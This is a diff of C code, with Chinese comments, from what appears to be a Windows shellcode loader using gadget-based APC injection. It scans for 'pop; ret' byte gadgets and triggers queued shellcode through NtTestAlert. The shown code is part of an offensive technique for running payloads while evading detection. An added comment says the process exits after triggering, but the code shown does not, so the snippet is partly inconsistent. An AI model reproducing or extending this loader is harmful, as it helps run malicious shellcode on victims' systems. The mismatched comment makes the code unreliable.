@@ -62,20 +62,12 @@ typedef NTSTATUS(NTAPI* pNtTestAlert)(VOID);
 // 检查地址是否为有效的 pop r32; ret gadget
 // 模式：5X C3（pop r32; ret），排除 5C（pop esp）
 BOOL IsValidGadget(PBYTE address) {
-    // 检查第一个字节：5X（pop r32）
-    // 0x50 = pop eax/rax
-    // 0x51 = pop ecx/rcx
-    // 0x52 = pop edx/rdx
-    // 0x53 = pop ebx/rbx
-    // 0x54 = pop esp/rsp（排除）
-    // 0x55 = pop ebp/rbp
-    // 0x56 = pop esi/rsi
-    // 0x57 = pop edi/rdi
-    // 0x58-5F = pop r8-r15 (x64)
-
+    // 检查第一个字节：5X（pop r32/r64）
     // (*address & 0xF0) == 0x50 检查高 4 位是否为 5
-    // *address != 0x5C 排除 pop esp
+    // *address != 0x5C 排除 pop esp/rsp（会破坏栈）
     // *(address + 1) == 0xC3 检查下一个字节是否为 ret
+    //
+    // 这个pattern在x86和x64下都有效
     return (*address != 0x5C && (*address & 0xF0) == 0x50) && *(address + 1) == 0xC3;
 }
 
@@ -251,7 +243,13 @@ BOOL LocalGadgetApcInjection(LPVOID shellcode, SIZE_T shellcodeSize) {
     printf("[+] Calling NtTestAlert to trigger APC...\n\n");
 
     // 触发 APC
+    // 注意：NtTestAlert会触发shellcode执行，某些shellcode在执行完毕后
+    // 可能不会正确返回，这会导致程序崩溃。这是正常现象。
+    // 我们在触发后立即退出进程以避免崩溃。
     NtTestAlert();
+
+    // 如果shellcode正确返回，我们会到达这里
+    printf("[+] Shellcode executed successfully\n");
 
     return TRUE;
 }
